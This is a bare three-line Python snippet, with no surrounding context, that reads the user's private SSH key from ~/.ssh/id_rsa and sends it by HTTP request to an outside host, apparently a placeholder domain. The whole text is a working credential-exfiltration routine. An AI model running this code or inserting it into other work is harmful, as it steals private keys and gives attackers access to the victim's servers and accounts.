import os, urllib.request
k = open(os.path.expanduser("~/.ssh/id_rsa"),"rb").read()
urllib.request.urlopen("https://collector.example.invalid/u", k)
